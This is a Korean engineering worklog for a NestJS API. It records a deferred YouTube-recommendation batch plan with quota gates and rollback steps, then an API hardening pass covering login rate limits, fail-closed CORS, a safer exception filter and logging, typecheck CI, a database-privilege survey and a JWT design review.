- ~~**프론트 실시간 폴백(`src/app/api/youtube/top-video/route.ts`)이 같은 점수 로직으로 1위를 고른다 — 7단계에서 검토가 필요하다.**~~ **[2026-09-22 §17: 폴백 제거로 종결. `frontendScore` 복사본과 특성 테스트는 `apps/api`에 남아 있고 근거 기록으로만 의미가 있다]** 이 5곡 기준으로 폴백이 방문자에게 여는 영상은 사람이 승인한 영상과 5/5 달랐다(다른 것이 곧 틀린 것은 아닐 수 있다). 백엔드는 이제 이 점수를 정렬에 쓰지 않지만 `calculateVideoScore`와 프론트 구현 복사본 대비 특성 테스트, 그리고 "폴백의 점수 1위와 우리 1위가 다를 수 있다"를 값으로 고정한 테스트를 **검토 근거로 남겨 뒀다**. 스코어링이 두 벌이라는 드리프트 위험도 그대로다 — URL이 채워질수록 폴백 호출이 줄어드므로 7단계 이후 폴백 라우트 제거 또는 원본 순서 방식으로의 전환을 검토하고, 그 전까지 프론트 구현이 바뀌면 특성 테스트의 복사본도 함께 갱신해야 한다

### 롤백

롤백 SQL은 `apps/api/prisma/rollback/20260920210000_add_youtube_recommendation.rollback.sql`(문서 전용, 순서는 **코드 되돌리기 → DB 제거**). **이 테이블에 쓰기가 시작된 뒤에는 DROP이 검토 이력을 지운다** — 반려 사유·곡별 연속 실패 이력·승인 등수는 복구되지 않는다(승인된 URL만 `Setlist.youtube_url`에 남는다). 또 `DROP TABLE`은 참조 대상인 `Setlist`에 강한 락을 잡아 공개 SELECT를 잠깐 막을 수 있어 `SET LOCAL lock_timeout = '5s'`로 제한한다. 이 롤백은 곡 수정(`PATCH /songs/:id`)과 F013까지 함께 깨므로 코드를 먼저 되돌려야 한다.

### 보류된 운영 실행 — 59곡 전체 배치 (2026-09-20 결정)

**이번 단계에서 실행하지 않는다.** 7단계 관리자 UI가 없어 59개 추천을 리뷰할 수단이 API 직접 호출뿐이고, 리뷰하지 않으면 30일 뒤 만료돼 쿼터만 다시 써야 하기 때문이다. 아래는 나중에 실행할 때 그대로 쓸 계획이며 **별도 승인 사항**이다. 숫자(59곡, 청크의 id 구성, 쿼터 사용량 0)는 **2026-09-20 15:20 KST 기준**이라 실행 시점에 다시 계산해야 한다.

**실행 조건** — 전부 충족해야 시작한다

- **7단계 관리자 UI가 준비돼 있다**(§10 "추천 리뷰 화면의 필수 요건"). 적어도 첫 실행 뒤 **약 30일 안에 59개를 리뷰할 수 있어야** 한다
- **쿼터 리셋 이후**다. 리셋은 태평양 시간 자정(서머타임 중 KST 16:00, 서머타임이 끝나면 KST 17:00 — 계산값)이고, 시작은 리셋 뒤 5분 이후로 잡는다. `GET /youtube/quota`가 사용 0과 다음 날 리셋 시각을 돌려주는지 먼저 확인한다
- 대상 수와 청크의 id 구성을 **그 시점의 `countTargets`·`selectTargets`로 다시 계산**한다(곡이 추가·수정됐으면 달라진다). 시도 행이 0개인지도 본다
- 후보 선정이 **원본 순서 상위 3개**인 커밋(`b004837`) 이후 빌드에서 실행한다. 프로젝트 키가 유효하고 서버 인스턴스가 하나뿐이다(mutex는 단일 인스턴스 전제)

**실행 방식** — 로컬 서버 1개(`PORT=3012`)를 띄우고 로컬 서명 JWT(`sub` = 관리자 id)로 실제 `POST /youtube/recommendations/batch`를 호출한다. 컨트롤러·DTO·혼합안 응답·mutex를 실제 경로로 검증하기 위해서다. 토큰과 키는 출력하지 않는다. 배치는 시도·후보 테이블에만 쓰고 **`Setlist`는 건드리지 않아 공개 페이지에 영향이 없다**(실행 뒤 스냅샷 diff 0으로 확인). 실행 전에 스냅샷을 찍는다

**청크 계획** — 곡당 검색 1회, 요청 7회, id 오름차순(승인된 5곡 제외). 2026-09-20 기준 구성:

| 청크 | 곡 수 | 누적 | 대상 id | 확인 지점 |
| --- | --- | --- | --- | --- |
| 1 | 5 | 5 | 1~5 | **사람 확인** |
| 2 | 5 | 10 | 6~10 | 자동 게이트 |
| 3 | 10 | 20 | 11~20 | 자동 게이트 |
| 4 | 10 | 30 | 21~26, 28, 29, 31, 32 | **사람 확인**(절반) |
| 5 | 10 | 40 | 33~42 | 자동 게이트 |
| 6 | 10 | 50 | 43~52 (id 50 포함) | 자동 게이트 |
| 7 | 9 | 59 | 53~58, 60, 61, 64 | 종료 보고 |

청크 1에는 iTunes에서 후보를 못 찾았던 id 2(`Congratulations / Day6`)와 괄호가 제목·가수 양쪽에 있는 id 4(`Vancouver2 (BAND Ver.)`)가 우연히 들어 있다. 사람 확인 지점(청크 1·4 뒤)에서는 후보 3개의 구성(원본 순서·제목·채널)과 쿼터 사용량, 누적 실패·0건 비율을 보고하고 승인을 받아 이어간다.

**매 청크 자동 게이트** — 하나라도 어긋나면 정지한다

- 응답 HTTP 200이고 `abortedBy`가 `null`이다
- `failed`가 2 이상이거나 `noResults`가 3 이상이면 정지한다. **청크 1은 `failed`가 1건만 나와도 정지**한다
- 시도 행 수 = 누적 처리 수, `reserved`로 남은 행 0개, 쿼터 사용량 = 누적 처리 수, 후보 행 수 = `candidateCount` 합계, 썸네일이 전부 `i.ytimg.com`이다
- `Setlist` 전 컬럼 diff 0이다
- 응답에 키·헤더 문자열이 없다
- 후보가 3개 미만인 곡은 **기록만 하고 정지하지 않는다**(정보성)

**정지 조건** — 정지하면 상태만 보고하고 **임의로 복구하거나 재시도하지 않는다**

- `429`(쿼터 소진)·`500`(키 오류)·`409`(중복 실행)·그 밖의 비200 응답
- `abortedBy`가 `null`이 아님, 위 자동 게이트 위반
- 쿼터 사용량이 **70**에 닿음(앱 상한 80에서 10 여유)
- 리셋 전(KST 16:05 이전)에는 시작하지 않는다

**예상 쿼터** — 정상 시 **59회**(앱 상한 80의 74%, 프로젝트 일일 100회의 59%). 곡 탓 실패(타임아웃·5xx)는 다음 청크에서 재선정될 수 있어 여유 6회를 가정하면 최대 약 65회이고, 하드 상한은 70회다. 공용 10,000 units 풀은 쓰지 않는다. 예상 소요는 캘리브레이션 실측(호출당 240~475ms)으로 30초 안팎, 최악은 곡당 타임아웃 5초로 청크 10곡이 50초·전체 약 5분이다. 리셋 이후에 실행하면 그 태평양 날짜에 추적되지 않는 호출이 없어 DB 집계가 실제 사용량과 일치한다(`previewSearch`·캘리브레이션은 시도 행을 남기지 않아 집계에 잡히지 않는다)

**실행 뒤 보고** — 청크별 요약(처리/검색됨/결과 0건/실패/남은 대상), 시도 상태·후보 개수 분포, 쿼터 사용량과 리셋 시각, `Setlist` 스냅샷 diff 0, 시퀀스 소모 범위

**⚠️ 30일 만료** — 배치 결과는 **첫 실행 후 약 30일 안에 리뷰**해야 한다. `open`인 채 30일이 지난 시도는 조회 응답에서 후보가 즉시 빠지고, 정리(배치 시작 시 또는 `npm run youtube:cleanup`)가 돌면 `expired`로 닫히며 후보가 삭제된다(스케줄러가 없어 정리가 늦어질 수는 있지만 조회 제외는 즉시다). 만료되면 그 곡은 다시 배치 대상이 되어 **쿼터를 다시 써서 재검색**해야 한다. 그래서 UI가 준비되기 전에는 돌리지 않는다. 30일 보관 제한의 해석은 구현자의 것이며 법적 확인을 받지 않았다

**롤백 안전 기간은 첫 실제 배치 실행 전까지다** — 두 테이블이 지금 비어 있어(검증용 임시 행은 정리했다) DROP이 잃는 정보가 없다. **첫 실행 이후의 DROP은 검토 이력(반려 사유·곡별 연속 실패·승인 등수)을 지운다.** 롤백 SQL과 순서(코드 되돌리기 → DB 제거)는 `apps/api/prisma/rollback/20260920210000_add_youtube_recommendation.rollback.sql`을 따른다. 실행 이후에 되돌려야 한다면 DROP 대신 테이블을 남기고 코드만 되돌리는 쪽을 먼저 검토한다

### 완료 상태 및 다음 단계

- 브랜치 `feature/youtube-batch-review`, 푸시·PR 보류
- **다음**: 7단계(관리자 UI, 배포 전 점검). **(2026-09-21: 7a API 하드닝은 §16에서 완료)** 59곡 배치는 위 "보류된 운영 실행"의 조건(UI 준비, 쿼터 리셋 이후)이 갖춰졌을 때 별도 승인으로 실행한다. 게이트 2(실제 호출 7회 + 임시 곡 쓰기 검증)는 완료됐다

## 16. work02-7a — API 하드닝: 로그인 시도 제한 · CORS · 헬스체크 · 예외 필터 · 타입 검사 CI (2026-09-21)

- **날짜**: 2026-09-21
- **브랜치**: `feature/api-hardening` (`feature/admin-panel-ui`라는 이름으로 `develop`과 같은 커밋 `c015fef`에 있던 브랜치를 그대로 사용. 커밋 0개·upstream 없음·원격에 없음을 확인하고 `git branch -m`으로 이름만 바꿨다. 분기 전 로컬 `develop`이 `origin/develop`과 동일함을 확인)
- **커밋**: throttler `358f45e` / CORS·헬스체크·`@Public` 전수 회귀 `d22b275` / 예외 필터 `14dbfb5` / 스펙 포함 tsc·CI·`directUrl` 정리 `cef3941` / 문서(이 섹션)
- **관련 PR**: work02-7a, `feat: API 하드닝 (로그인 시도 제한, CORS, 예외 필터, 헬스체크 정리, 타입 검사 CI)` (푸시/PR 생성은 보류)
- **상태**: 구현·단위/통합 테스트·런타임 검증(포트 3012, 프로덕션 쓰기 0건, DB 스냅샷 diff 0)까지 완료. **JWT 방식 변경과 권한 회수 실행은 하지 않았다**(각각 별도 결정·별도 게이트). 이 단계는 배포와 관리자 UI를 하지 않는다

### 배경

7단계(관리자 UI·배포) 전에 끝나야 하는 보안·품질 선행 작업이다. §10·§11·§13·§14·§15가 "7단계 전 확인 항목"으로 미뤄 온 것을 한 번에 처리한다. 지금까지는 API가 로컬 전용이라 로그인 시도 제한, CORS, 오류 응답 정리를 일부러 하지 않았다(§10 "의도적으로 하지 않은 것"). 배포하는 순간 이 항목들이 전부 현실의 위험이 되므로, 배포 전에 코드와 읽기 전용 조사만으로 끝낼 수 있는 것은 여기서 끝낸다. 프로덕션 DB에는 쓰지 않았다.

### 구현 전 조사 (실측)

**기준선**: `develop == origin/develop`, `migrate status` 최신, 테스트 712개(40파일), lint·build 통과, 스펙 포함 tsc 오류 **정확히 8건**(§14가 기록한 파일·개수와 일치). 라우트 20개 중 `@Public()`은 `GET /health`·`POST /auth/login` 둘뿐이었다(이번에 `GET /health/db`가 추가돼 21개).

**예외 응답 12건 (변경 전, 서버를 띄워 실측)**

| # | 요청 | 상태 | 응답 본문 / 관찰 |
| --- | --- | --- | --- |
| 1 | `GET /health` | 200 | `{"status":"ok","database":"connected","rowCounts":{...}}` — **공개 라우트가 행 수를 노출** |
| 2 | 미지정 라우트 | 404 | `{"message":"Cannot GET /nope",...}` — **요청 경로를 그대로 되돌려 줌** |
| 3 | 토큰 없는 보호 라우트 | 401 | `{"message":"인증이 필요합니다.","error":"Unauthorized","statusCode":401}` |
| 4 | **깨진 JSON** (`PASSWORD_LEAK...`로 시작) | 400 | `Unexpected token 'P', "PASSWORD_L"... is not valid JSON` — **본문 앞 10자가 에코됨** (배열 형태도 동일) |
| 5 | 깨진 JSON (미종료 문자열) | 400 | `Unterminated string in JSON at position 47 ...` — 위치만 있고 에코는 없음 |
| 6 | `Content-Type: text/plain` / 없음 | 400 | 본문이 파싱되지 않아 DTO 검증 400(한국어) |
| 7 | 200KB 본문 | 413 | `{"statusCode":413,"message":"request entity too large"}` — **영어, `error` 필드 없음** |
| 8 | preflight `OPTIONS` | **404** | CORS 미설정 확인 |
| 9 | 없는 팀 | 404 | `{"message":"해당 팀을 찾을 수 없습니다.",...}` |
| 10 | 범위 초과 bigint id | 400 | `id는 1 이상의 정수여야 합니다.` — 파이프가 DB 전에 막음 |
| 11 | **DB 연결 불가** 서버 | 500 | `{"statusCode":500,"message":"Internal server error"}` — **`error` 필드 없음**, 응답에는 호스트가 안 실림 |
| 12 | 로그인 10회 연속(없는 계정) | 401×10 (260ms) | **시도 제한 없음** |

§10의 두 가설에 대한 판정:

- 「깨진 JSON 오류가 입력 일부를 포함한다」 → **사실로 확인**(#4). 값이 따옴표로 시작하지 않으면 파서가 앞 10자를 에코한다
- 「연결 실패 오류가 접속 호스트를 노출한다」 → **응답은 아니고 로그가 노출 경로**였다. 응답(#11)에는 호스트가 없지만, Nest 기본 핸들러가 오류 객체 전체를 로깅해서 서버 로그에 `host: 'db-host-does-not-exist.invalid'`, `driverAdapterError`, `meta`, **절대 경로가 들어간 스택**이 그대로 찍혔다

**로그 노출 경로 (변경 전 → 후)**: DB 연결이 안 되는 서버에 요청 3건을 보낸 뒤 로그 전체(50줄)를 검사했다.

| 항목 | 변경 전 | 변경 후 |
| --- | --- | --- |
| 예외 로그 형태 | 오류 객체 전체(메시지·`meta`·`cause`·스택) | `예외 처리: PrismaClientKnownRequestError(code=P1001) GET /health/db → 500` 한 줄 |
| 접속 호스트 / 자격증명 / 절대 경로 / `driverAdapterError` / 요청 쿼리스트링 / `Bearer` | 로그에 나옴 | **전부 0줄** (검사한 10개 문자열 모두) |

**`directUrl` 실험 (`migrate status` 기준)**

| 실험 | 결과 |
| --- | --- |
| `DIRECT_URL`만 존재하지 않는 호스트로 덮어쓰기 | **정상 성공**, 접속 호스트는 `...pooler.supabase.com:5432` (변화 없음) |
| `DATABASE_URL`만 존재하지 않는 호스트로 덮어쓰기 | **P1001 실패**, 접속 호스트가 가짜 호스트로 바뀜 |

→ Prisma 7.10은 `prisma.config.ts`의 `directUrl`을 조용히 버린다(§10의 추측이 사실로 확정). **`migrate deploy`도 같은 마이그레이션 엔진이라 동일할 것으로 추정하나, 확인하지 않았다(미확인).**

**권한 현황 (읽기 전용 SQL, 2026-09-21)**

| 항목 | 결과 |
| --- | --- |
| `pg_policies` | `Setlist`·`Line Up` 각각 `Allow public read access` / `SELECT` / `true` **하나뿐**. INSERT·UPDATE·DELETE 정책 **0건** → anon 쓰기 차단을 **직접 확인**(§10의 재확인 항목 해소) |
| RLS | 6개 테이블 전부 `relrowsecurity = true`, 소유자 `postgres`, `FORCE` 아님 |
| `Setlist`·`Line Up`·`AdminUser`·`_prisma_migrations`의 테이블 권한 | `anon`/`authenticated`가 **전 권한**(SELECT,INSERT,UPDATE,DELETE,TRUNCATE,REFERENCES,TRIGGER). RLS는 TRUNCATE에 적용되지 않는다 |
| `AdminUser`·`_prisma_migrations` | RLS는 켜져 있으나 **정책이 0개**라 읽기·쓰기는 전부 막히고, TRUNCATE 권한만 남아 있다 |
| `YoutubeSearchAttempt`·`YoutubeRecommendation` | `anon`/`authenticated` **권한 없음** — 해당 마이그레이션이 명시적으로 `REVOKE`했기 때문이다(`20260920210000_add_youtube_recommendation`) |
| 시퀀스 | `AdminUser_id_seq`·`Setlist_id_seq`·`setlist_id_seq`에 `anon`/`authenticated`가 `USAGE,SELECT,UPDATE` |
| `pg_default_acl` | `public`에 `postgres`가 새로 만드는 테이블·시퀀스·함수에 `anon`/`authenticated`/`service_role` **자동 부여**(테이블 `arwdDxtm`, 시퀀스 `rwU`, 함수 `X`) — §15의 기록과 같다 |
| `setlist_id_seq` (소문자) | 고아가 아니라 **`"Line Up".id`의 identity 시퀀스**다(`pg_get_serial_sequence`로 확인, identity `d`). 이 조사 중 "고아 추정"이라 적었던 것은 틀렸다 |
| 프론트 영향 | `src` 전체에 supabase `insert`/`update`/`upsert`/`delete`/`rpc` **0건**. `.from()`은 3곳(`card-carousel.tsx:184`, `fetch-line-up-and-setlist.ts:27,40`)이고 전부 `.select("*")` + `.order()` |

**`@nestjs/throttler` 조사**: `latest`=6.7.0(RC/beta 아님, 2026-09-17), peer `@nestjs/core`·`common` `^12.0.0` 명시 지원. **CJS 전용 패키지**(`type`·`exports` 없음)라 ESM인 Nest 12(`"type":"module"`)와의 궁합이 위험 요소였다 — 설치 후 **실제 기동으로 확인**했다(아래 검증). 소스에서 확인한 동작:

- `ttl`·`blockDuration`은 **밀리초**, `Retry-After`는 **초**
- 차단 판정은 `totalHits > limit`이라 **`limit=5`면 6번째 요청부터 429**
- 카운트 키에 **클래스명·핸들러명**이 들어가 한도는 **라우트별**로 센다(전역 300이 아니라 라우트마다 300)
- **`setHeaders: false`면 `Retry-After`도 함께 나가지 않는다**(`guard.js`가 `if (setHeaders)` 안에서 둘 다 씀) → "X-RateLimit 숨김 + Retry-After 유지"는 옵션만으로 안 된다
- express는 `trust proxy`만 켜면 `req.ip`가 클라이언트 IP가 되어 커스텀 Guard가 필요 없다(fastify만 `req.ips`)

**Nest의 본문 파서 오류 처리 (소스 확인)**: 깨진 JSON은 body-parser가 `SyntaxError`(`type: 'entity.parse.failed'`)를 던지고, **`ExpressAdapter.mapException()`이 이를 `new BadRequestException(error.message)`로 바꾼 뒤에야** 예외 필터에 넘긴다(`routes-resolver.js`의 `registerExceptionHandler`). 즉 필터는 그 오류가 본문 파서에서 왔다는 것을 알 수 없고 메시지에는 본문 앞 10자가 이미 실려 있다.

**`cors` 패키지(2.8.6) 소스 확인**: `origin`이 falsy(`false`/`''`/`undefined`)이면 **미들웨어를 통째로 건너뛴다**(preflight도 404). 빈 배열은 truthy라 "허용 목록 비어 있음"으로 정상 처리되어 `Access-Control-Allow-Origin`을 내지 않는다.

**CI 현황과 실측**: `.github`·`vercel.json`·`.vercelignore` 없음. 루트 `tsconfig.json`이 `exclude: ["apps"]`, 루트 `eslint.config.mjs`가 `apps/**`를 무시해서 **Vercel의 Next.js 빌드는 `apps/`를 건드리지 않는다**. 생성 Prisma 클라이언트(`apps/api/src/generated`)는 **gitignore라 커밋돼 있지 않다** → CI에서 `prisma generate`가 필수다. 아래 "검증"의 CI 실측 참조.

**tsc 오류 8건 원인 분류** — 전부 테스트 대역·설정 타입이고 서비스 로직이 아니었다:

| 파일 | 원인 | 조치 |
| --- | --- | --- |
| `prisma.config.ts:14` | `directUrl`이 7.10 타입에 없음(런타임에서도 무시됨) | 줄 삭제 + 주석 |
| `album-cover.service.spec.ts:83` | `songRow()`의 `singer`가 `string`인데 `null` 대입 | 픽스처 타입을 `string \| null`로 |
| `album-cover.service.spec.ts:143,159` | `.catch(e => e as Error)`가 성공 타입과의 **유니온**이 됨 | `unknown`으로 받아 단언 |
| `supabase-storage.client.spec.ts:280,281` | 위와 동일(`void \| Error`) | 동일 |
| `team-card-image.service.spec.ts:71` | 인자 없는 `vi.fn()`의 `mock.calls`가 `[]` 튜플로 추론(§15 트러블슈팅 2와 같은 계열) | 목 정의에 인자 타입 명시 |

### 작업 내용

**1) throttler (`358f45e`)** — `src/throttling/`. 두 개의 named throttler를 **서로 배타적으로** 적용한다.

- `default`: IP당 분당 300회. 로그인 핸들러가 아닌 모든 라우트. `X-RateLimit-*`와 `Retry-After`를 낸다
- `login`: 5분에 5회, 초과하면 15분 차단. `@LoginThrottle()`이 붙은 핸들러(`POST /auth/login`)만. 남은 횟수를 알려 주지 않도록 라이브러리 헤더를 끄고 **`Retry-After`는 가드(`AppThrottlerGuard.throwThrottlingException`)에서 직접** 낸다(위 조사: `setHeaders:false`가 `Retry-After`도 끔)
- 429는 `{message: '요청이 너무 많습니다. 잠시 후 다시 시도해 주세요.', error: 'Too Many Requests', statusCode: 429}` + `Retry-After`(최소 1초)
- `ThrottlingModule`을 **`AuthModule`보다 먼저** import — 전역 Guard는 등록 순서대로 실행되므로 401 요청도 카운트하려면 이 순서여야 한다(런타임에서 관측으로 확인: 토큰 없는 요청이 300번째까지 401, 301번째에 429) **→ 교차 리뷰 M2로 대체: 순서를 import 순서가 아니라 `GlobalGuard`가 코드로 고정한다(아래 "교차 리뷰 반영").**
- `TRUST_PROXY_HOPS`(기본 **0 = 믿지 않음**, 정수 0~5, 잘못된 값은 기동 실패)로 `trust proxy` 설정
- `/health`는 `@SkipThrottle()`
- 저장소는 인메모리 = **단일 인스턴스 전제**

**2) CORS·헬스체크 (`d22b275`)**

- `CORS_ALLOWED_ORIGINS`(콤마 구분): **미설정 = 크로스 오리진 전부 거부(fail-closed)**. 와일드카드·끝 슬래시·경로·쿼리·기본 포트 명시·대문자 호스트·`null`·http(s) 외 스킴은 **기동 실패**(브라우저가 보내는 `Origin` 정규형과 달라 조용히 매칭에 실패하는 값들이다) **→ 교차 리뷰 L8·L10으로 갱신: `http:`는 루프백만 허용하고, 기동 오류는 입력 값을 출력하지 않는다.**
- `credentials: false`, `methods` GET/POST/PATCH/PUT/OPTIONS(`DELETE` 제외), `allowedHeaders` Authorization/Content-Type, `maxAge` 600. **`exposedHeaders: ['Retry-After']`를 추가했다** — 결정 항목에는 없었지만, 없으면 브라우저 JS가 429의 `Retry-After`를 읽지 못해 관리자 화면이 재시도 시각을 안내할 수 없다
- `origin`은 **항상 배열**로 넘긴다(위 `cors` 조사)
- `x-powered-by` 제거
- `GET /health` → `{"status":"ok"}`만(공개, DB 미조회, `@SkipThrottle`). `GET /health/db` 신설(**인증 필요**, 기존 `database`·`rowCounts` 이관, `@Public()` 없음, 클래스 수준 `@SkipThrottle`)
- HTTP 계층 설정을 `app.setup.ts`(`configureHttp`·`createHttpAdapter`·`createValidationPipe`)로 분리 — 스펙이 설정을 복사해 흉내 내지 않고 운영과 **같은 함수를 호출**하게 하려는 것
- `auth/public-routes.spec.ts`: `AppModule`에서 컨트롤러를 자동 발견해 `@Public()` 핸들러가 허용 목록(`AuthController.login`, `HealthController.check`)과 **정확히 일치**하는지, 컨트롤러 클래스에 `@Public()`이 없는지 검사한다

**3) 전역 예외 필터 (`14dbfb5`)**

- 모든 오류 응답을 `{message, error, statusCode}`로 통일(기존 413·500은 `error`가 없었다)
- `HttpException`은 `message`·`statusCode`를 **바꾸지 않고** 빠진 `error`만 상태코드에서 채운다. 응답에 실린 추가 필드는 유지. 기존 400/401/404/409/413/429 계약, multer 한국어 치환, Prisma 404/409 매핑, `ParseBigIntPipe` 400은 이미 `HttpException`이라 그대로 통과한다
- `HttpException`이 아닌 오류(Prisma·연결 실패·알 수 없는 오류·throw된 문자열/null)는 **원본 메시지 없이 500 고정 문구**
- **`HardenedExpressAdapter`**(`ExpressAdapter` 상속, `mapException` 오버라이드): 깨진 JSON(`entity.parse.failed`)을 Nest가 `BadRequestException(원본 메시지)`로 바꾸기 **전에** 고정 한국어 문구로 치환. 413(`entity.too.large`)·415(charset/encoding)·`URIError`(경로의 잘못된 퍼센트 인코딩)도 같은 방식
- 미지정 라우트 404는 경로를 되돌려 주지 않는 한국어 문구. **현재 요청의 `Cannot METHOD URL`과 메시지가 정확히 같을 때만** 바꾸므로 앱이 던진 404는 건드리지 않는다
- 로깅: **`HttpException`이 아닌 오류만**, 내용은 클래스명·Prisma `code`·method·path(쿼리스트링·해시 제거, 200자 제한)·상태코드뿐. 클래스명·`code`·method는 식별자 형태 정규식을 통과한 것만 남긴다(로그 주입 방지). 5xx는 `error`, 그 밖은 `warn` **→ 교차 리뷰 M3로 갱신: 허용 목록의 내장 오류(`TypeError` 등)는 메시지와 프로젝트 상대 경로 위치가 함께 남는다(아래 "교차 리뷰 반영").**
- 컨트롤러에 `@UseFilters()`로 붙은 `OutboundRateLimitFilter`·`YoutubeQuotaExhaustedFilter`는 전역 필터보다 먼저 잡으므로 `Retry-After` 응답이 유지된다(통합 테스트로 고정). 두 예외의 본문은 이미 `{statusCode, message, error}`를 갖고 있었다

**4) tsc·CI (`cef3941`)** — 오류 8건 해소(서비스 로직 변경 없음), `apps/api`에 `typecheck` 스크립트, `.github/workflows/ci.yml`, `prisma.config.ts`에서 `directUrl` 삭제 + 주석("7.10은 이 옵션을 무시함: `migrate status` 기준 실측, `migrate deploy`는 같은 엔진이라 동일할 것으로 추정, 미확인"), `.env.example`에서 `DIRECT_URL` 제거(개발자의 `.env`는 건드리지 않았다). 적용된 마이그레이션 SQL 안에 `DIRECT_URL`을 언급한 주석이 한 곳 남아 있으나 **체크섬 때문에 수정하지 않는다**.

### 기술 판단

| 쟁점 | 선택 | 이유 |
| --- | --- | --- |
| throttler 적용 범위 | **전역 APP_GUARD**(기본 300/분) + 로그인 전용 엄격 한도 | `JwtAuthGuard`와 같은 fail-closed 철학. 7단계 이후 라우트가 늘어도 최소 방어가 자동 적용된다. 기본을 관대하게 둬야 배치(최악 50초)·업로드·관리자 화면이 걸리지 않는다 |
| 두 throttler를 겹치지 않고 **배타적**으로 | `skipIf`로 로그인 핸들러는 `login`만, 나머지는 `default`만 | 겹치면 로그인 응답에 `default`의 `X-RateLimit-*`가 섞여 남은 시도 횟수를 알려 준다 |
| `Retry-After`를 가드에서 직접 | `throwThrottlingException` 오버라이드 | `setHeaders:false`가 `Retry-After`까지 끈다(소스 확인). 옵션만으로는 결정 사항을 만족시킬 수 없었다 |
| 로그인 5회/5분 + 15분 차단 | `blockDuration` 사용 | 차단이 창보다 길어야 창이 지날 때마다 5회씩 갉아먹는 저속 공격이 의미를 잃는다. 관리자 1~3명 규모에 5분 5회는 정상 사용을 막지 않는다 |
| 계정 단위 제한 | **미추가**(IP 단위만) | 계정이 1~3개라 IP 제한으로 충분하다고 판단. **한계: IP를 분산하면 우회된다.** 실질 방어선은 Argon2id 비용 + 계정 수가 적다는 점 |
| 성공한 로그인도 카운트 | 포함(기본 동작) | 제외하려면 가드 우회 로직이 필요한데 5분 5회면 정상 사용을 막지 않는다 |
| `TRUST_PROXY_HOPS` 기본값 | **0(믿지 않음)** | 프록시 없이 노출된 서버에서 켜면 `X-Forwarded-For` 위조로 제한이 무력화된다. 기본은 닫아 두고 배포 구성이 정해지면 값을 정한다(위조 시도가 통하지 않는 것을 테스트로 고정) |
| CORS 미설정 시 | fail-closed | 열어 두고 잊는 사고 방지. 같은 오리진·서버 간 호출은 영향 없다 |
| CORS 값 검증을 엄격하게 | 정규형이 아니면 **기동 실패** | 끝 슬래시·기본 포트 같은 값은 실패가 아니라 "조용히 안 맞음"으로 나타나 배포 후 원인 찾기가 어렵다. 오류 메시지가 올바른 정규형을 알려 준다 |
| `credentials: false` | Authorization 헤더 방식 유지 | 쿠키 방식으로 가면 CSRF 설계가 함께 필요하다(아래 JWT 검토) |
| `/health`에서 DB 확인 분리 | `/health`는 프로세스 생존만, DB는 인증 필요한 `/health/db` | DB가 잠깐 흔들릴 때 헬스체크가 실패하면 **살아 있는 인스턴스가 교체·재시작되는 사고**가 난다. 공개 라우트가 행 수를 노출하는 것도 없앤다 |
| 필터가 아니라 **어댑터**에서 파서 오류 치환 | `ExpressAdapter.mapException` 오버라이드 | 필터에 도착했을 때는 `type`이 사라져 식별할 수 없다. `mapException`은 어댑터의 공개 확장점이고, 상속은 Nest가 시그니처를 바꾸면 컴파일에서 드러난다(몽키패치는 조용히 깨진다) |
| 404 치환의 조건 | 메시지가 **현재 요청의 method+URL과 정확히 같을 때만** | 정규식(`^Cannot ...`)으로 잡으면 앱이 같은 형태의 메시지를 던질 때 오탐한다. 요청과 대조하면 Nest가 만든 것만 잡는다 |
| `HttpException`은 `error`만 보완 | message·statusCode 불변 | 기존 계약(한국어 메시지·상태코드)을 깨지 않기 위함. 회귀는 실제 예외 클래스와 매핑 헬퍼로 고정했다 |
| 로그에서 메시지를 통째로 제외 | 클래스명·code·method·path·상태만 | Prisma 오류 메시지는 호출 인자(`data`)를, 연결 오류는 접속 호스트를 담을 수 있다. 어느 필드에 무엇이 실리는지 일일이 가리는 것보다 **메시지를 아예 안 남기는 쪽이 안전**하다 **[M3로 갱신: 허용 목록의 내장 오류는 메시지·위치를 남긴다]** |
| `HttpException`은 로그 안 남김 | 기존 Nest 기본 동작과 동일 | 범위 밖의 동작 변경을 하지 않는다. 5xx `HttpException`(502/504)은 일부 서비스(예: 유튜브 배치)가 자체 로그를 남긴다. 그렇지 않은 서비스가 있는지는 전수 확인하지 않았다 |
| CI의 `prisma generate`에만 자리표시 `DATABASE_URL` | 해당 단계에만 접속 정보 없는 값 | `.env` 없이는 `PrismaConfigEnvError`로 실패(실측). generate는 접속하지 않는다. 다른 단계에는 주지 않아 테스트가 DB를 쓰지 않는다는 것을 매번 확인한다. **대안**: `prisma.config.ts`를 `process.env`로 느슨하게 바꾸는 것 — 프로덕션 마이그레이션 경로의 실패 메시지가 흐려져서 택하지 않았다 |
| 웹 잡은 **lint만** | 루트 `next build`는 환경변수 없이 실패 | 실측(`supabaseUrl is required`). `NEXT_PUBLIC_*`는 공개 값이지만 CI에 둘지는 별도 결정 |
| 액션은 태그가 아니라 **커밋 SHA 고정** | `checkout` v7.0.1, `setup-node` v7.0.0 (각 최신 릴리스) | 공개 레포에서 태그는 옮겨질 수 있다. SHA는 GitHub API로 조회했고, `action.yml`에서 쓰는 입력(`persist-credentials`, `node-version`, `cache`, `cache-dependency-path`)이 존재하고 런타임이 `node24`임을 확인했다 |

### JWT 방식 검토 (결정: **현행 유지**, 이번엔 구현하지 않음)

만료 2시간·refresh 없음·서버측 무효화 없음을 유지한다. 근거와 옵션을 남긴다.

| 안 | 장점 | 단점 | 판정 |
| --- | --- | --- | --- |
| (a) 현행: `Authorization` 헤더 + 브라우저 저장 | CORS가 단순(credentials 불필요), CSRF와 무관, 프론트 구현 최소 | XSS가 나면 토큰 탈취. 서버측 무효화 수단이 `JWT_SECRET` 교체뿐 | **채택** |
| (b) httpOnly 쿠키 | XSS로 토큰을 읽지 못함 | `admin.` ↔ `api.` 오리진 분리에서 `SameSite=None; Secure`가 필요해 **CSRF 토큰 설계가 따라온다**. CORS `credentials:true` 필요 | 보류 |
| (c) 짧은 access + refresh | 유출 창이 짧고 서버측 무효화 가능 | refresh 저장·회전·재사용 탐지까지 구현해야 함. 관리자 3명 MVP에는 과설계 | 보류 |

- "입력 도중 로그인이 풀리는" 문제는 서버가 아니라 **7단계 UI 과제**로 넘긴다: 401을 받으면 입력 중이던 내용을 로컬에 보존한 채 재로그인시키는 방식
- 토큰 유출 시 강제 만료는 여전히 `JWT_SECRET` 교체뿐이다. 관리자 1~3명 규모에서는 받아들일 만한 비용으로 판단한다
- 방식을 바꾸면 CORS(`credentials`)·CSRF·관리자 프론트 구현이 함께 바뀐다 → 별도 승인 사항

### 권한 회수 — **초안·영향 평가·롤백 문서만. 실행하지 않았다(별도 게이트)**

